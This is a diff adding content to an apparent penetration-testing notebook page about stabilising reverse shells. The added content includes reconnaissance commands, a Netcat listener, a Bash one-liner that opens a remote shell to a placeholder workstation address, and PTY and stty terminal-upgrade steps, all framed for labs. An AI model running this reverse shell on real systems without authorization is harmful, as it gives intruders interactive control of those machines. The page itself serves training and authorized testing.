@@ -9,6 +9,112 @@ hideFooterPagination: true
 
 {/* Generated from Commands/shell-upgrade.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Turn execution into a usable session
+
+First establish that a simple command runs and identify the account. Then choose a session method that matches the target OS, installed programs, network direction and required interactivity. A shell connection, an elevated token and a stable terminal are different milestones.
+
+### Establish execution and network context
+
+```bash
+# Linux target:
+id
+uname -a
+command -v bash python3 nc curl
+ip route
+```
+
+```powershell
+# Windows target:
+whoami
+whoami /priv
+$PSVersionTable.PSVersion
+ipconfig
+```
+
+Keep command output with the application/process that executed it. A web server worker and an interactive user session may have different accounts, environment variables, permissions and network access.
+
+### Prepare and test the receiving side
+
+```bash
+# Workstation:
+nc -lvnp 4444
+ip -br addr
+ss -lntp
+```
+
+Use an address reachable from the target, often the lab/VPN interface rather than a local desktop network. A listener is only one side of the path; a target's outbound filtering or route can prevent the callback.
+
+### Use the target's actual shell syntax
+
+```bash
+# Linux target, explicitly using Bash:
+bash -c 'bash -i >& /dev/tcp/WORKSTATION_IP/4444 0>&1'
+```
+
+This relies on Bash behavior and a permitted TCP path. If the entry point applies URL, JSON or form encoding, account for that transport separately from shell quoting. Do not assume a command that works in a terminal can be pasted unchanged into every web parameter.
+
+For Windows, use the platform-specific payload examples below or the Windows reverse-shell tool page. Match staged/stageless payload choice, architecture and handler settings if using a framework. A raw Netcat listener is not a substitute for every specialized handler.
+
+### Upgrade a Linux terminal deliberately
+
+```bash
+# In the received remote shell:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
+Suspend the local foreground Netcat process with Ctrl-Z, record the local terminal dimensions, then put that local terminal into raw mode and resume the connection:
+
+```bash
+# Local workstation terminal after Ctrl-Z:
+stty size
+stty raw -echo; fg
+```
+
+```bash
+# Remote shell: use the rows/columns reported by the local terminal.
+stty rows ROWS columns COLUMNS
+```
+
+Test input, job control and an interactive command. If the session exits and the local terminal becomes unreadable, restore it with `stty sane` or `reset` in that local terminal.
+
+### Diagnose the missing milestone
+
+| Result | Next investigation |
+| --- | --- |
+| Simple command fails | Injection/quoting, process context and available binary |
+| Command works, no callback | Listener bind, reachable callback IP, port, egress and payload syntax |
+| TCP connects then exits | Payload/handler mismatch, process lifetime, stdin/stdout handling |
+| Shell works but interactive program fails | PTY, terminal mode, dimensions and environment |
+| Shell works but admin command fails | Actual user, groups, privileges and elevation |
+| Shell disappears with request | Parent process lifetime and the execution mechanism |
+
+Keep a stable authorized session before moving to local enumeration or transfers. Record the exact successful method so a later tunnel or privilege step is not blamed for a fragile initial shell.
+
+## Upgrade a Linux shell: choose the operation and read the result
+
+Upgrade the target shell and restore terminal handling on Kali.
+
+### What the result establishes
+
+A successful upgrade gives usable terminal input, signals and job control; test these before running an interactive program.
+
+### Prerequisites and common failures
+
+The local terminal's raw mode and the remote pseudo-terminal are separate steps; restoring terminal state matters when a session exits.
+
+### Example 1: Commands
+
+Run in: **Kali and Linux target**.
+
+```bash
+Ctrl-C
+```
+
+## Saved commands and notebook recipes
+
+Upgrade the target shell and restore terminal handling on Kali.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=shell-upgrade) · [All tools](/index)
@@ -20,6 +126,13 @@ Replace UPPER_CASE values with your lab values.
 ```bash
 Ctrl-C
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Fully stabilising a shell (the upgrade you'll use constantly)](/exploitation/shells-payloads-cheat-sheet#fully-stabilising-a-shell-the-upgrade-you-ll-use-constantly)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
@@ -41,6 +154,13 @@ stty raw -echo; fg                                # on your box
 export TERM=xterm
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Getting Started with Penetration Testing — Shells — the heart of "access"](/getting-started/getting-started-cheat-sheet#shells-—-the-heart-of-access)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Exploitation steps">
@@ -52,6 +172,13 @@ export TERM=xterm
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [HTB Nibbles: Walkthrough and Report — Exploitation steps](/cheatsheets/nibbles#exploitation-steps) · [HTB Nibbles: Walkthrough and Report — Technical walkthrough](/cheatsheets/nibbles#technical-walkthrough) · [Shells, Payloads, and Interactive TTYs — Spawning Interactive TTY Shells](/exploitation/shells-payloads-cheat-sheet#spawning-interactive-tty-shells)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -68,6 +195,13 @@ stty raw -echo; fg
 # back in the shell:
 export TERM=xterm
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kali Terminal, tmux, zsh, and Vim — 7. Useful Kali workflow tips](/cheatsheets/terminal-tmux-zsh-cheatsheet#7-useful-kali-workflow-tips)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -94,6 +228,13 @@ export SHELL=/bin/bash
 stty rows 38 columns 116        # use your real size — check with `stty size` locally first
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Fully stabilising a shell (the upgrade you'll use constantly)](/exploitation/shells-payloads-cheat-sheet#fully-stabilising-a-shell-the-upgrade-you-ll-use-constantly)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Shells, Payloads, and Interactive TTYs**
 
 Context from the notebook: Your  stty raw -echo  is still in effect locally. Just type  reset  (even if you can't see it) and press Enter to restore your terminal.
@@ -101,6 +242,13 @@ Context from the notebook: Your  stty raw -echo  is still in effect locally. Jus
 ```text
 stty raw -echo
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Fully stabilising a shell (the upgrade you'll use constantly)](/exploitation/shells-payloads-cheat-sheet#fully-stabilising-a-shell-the-upgrade-you-ll-use-constantly)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -116,6 +264,13 @@ meterpreter > shell
 python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Spawning TTY After Getting Shell](/exploitation/shells-payloads-cheat-sheet#spawning-tty-after-getting-shell)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Spawning Interactive TTY Shells">
@@ -130,6 +285,21 @@ Context from the notebook: Python python -c 'import pty; pty.spawn("/bin/bash")'
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Spawning Interactive TTY Shells](/exploitation/shells-payloads-cheat-sheet#spawning-interactive-tty-shells)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
